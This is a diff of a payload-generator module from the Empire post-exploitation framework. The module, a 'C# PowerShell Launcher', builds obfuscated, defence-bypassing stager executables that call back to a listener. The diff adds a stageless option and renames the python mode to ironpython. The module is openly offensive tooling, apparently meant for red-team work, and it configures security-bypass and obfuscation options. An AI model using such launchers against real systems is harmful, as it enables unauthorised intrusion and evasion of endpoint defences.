@@ -1,31 +1,40 @@
 from __future__ import print_function
 
-import base64
-import shutil
 from builtins import object
 
-from empire.server.common import helpers
+from empire.server.common.helpers import (
+    strip_powershell_comments,
+    strip_python_comments,
+)
+from empire.server.utils.data_util import ps_convert_to_oneliner
 
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "C# PowerShell Launcher",
-            "Author": ["@Cx01N", "@hubbl3"],
+            "Authors": [
+                {
+                    "Name": "Anthony Rose",
+                    "Handle": "@Cx01N",
+                    "Link": "https://twitter.com/Cx01N_",
+                },
+                {
+                    "Name": "Jake Krasnov",
+                    "Handle": "@hubbl3",
+                    "Link": "https://twitter.com/_Hubbl3",
+                },
+            ],
             "Description": "Generate a PowerShell C#  solution with embedded stager code that compiles to an exe",
             "Comments": ["Based on the work of @bneg"],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Language": {
                 "Description": "Language of the stager to generate (powershell, csharp).",
                 "Required": True,
                 "Value": "csharp",
-                "SuggestedValues": ["powershell", "csharp", "python"],
+                "SuggestedValues": ["powershell", "csharp", "ironpython"],
                 "Strict": True,
             },
             "DotNetVersion": {
@@ -82,14 +91,18 @@ class Stager(object):
                 "Required": False,
                 "Value": "mattifestation etw",
             },
+            "Staged": {
+                "Description": "Allow agent to be staged",
+                "Required": True,
+                "Value": "True",
+                "SuggestedValues": ["True", "False"],
+                "Strict": True,
+            },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -108,30 +121,34 @@ class Stager(object):
         bypasses = self.options["Bypasses"]["Value"]
         obfuscate = self.options["Obfuscate"]["Value"]
         obfuscate_command = self.options["ObfuscateCommand"]["Value"]
-        outfile = self.options["OutFile"]["Value"]
 
-        if not self.mainMenu.listeners.is_listener_valid(listener_name):
-            # not a valid listener, return nothing for the script
-            return "[!] Invalid listener: " + listener_name
+        obfuscate_script = False
+        if obfuscate.lower() == "true":
+            obfuscate_script = True
 
+        staged = self.options["Staged"]["Value"].lower() == "true"
+
+        if not staged and language != "csharp":
+            launcher = self.mainMenu.stagers.generate_stageless(self.options)
+
+            if language == "powershell":
+                launcher = ps_convert_to_oneliner(strip_powershell_comments(launcher))
+            elif language == "ironpython":
+                launcher = strip_python_comments(launcher)
         else:
-            obfuscate_script = False
-            if obfuscate.lower() == "true":
-                obfuscate_script = True
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listener_name,
+                language=language,
+                encode=False,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+                bypasses=bypasses,
+            )
 
-        # generate the PowerShell one-liner with all of the proper options set
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listener_name,
-            language=language,
-            encode=False,
-            obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-            bypasses=bypasses,
-        )
         if launcher == "":
             return "[!] Error in launcher generation."
         else:
@@ -152,7 +169,7 @@ class Stager(object):
                 code = f.read()
             return code
 
-        elif language.lower() == "python":
+        elif language.lower() == "ironpython":
             directory = self.mainMenu.stagers.generate_python_exe(
                 launcher, dot_net_version=dot_net_version
             )
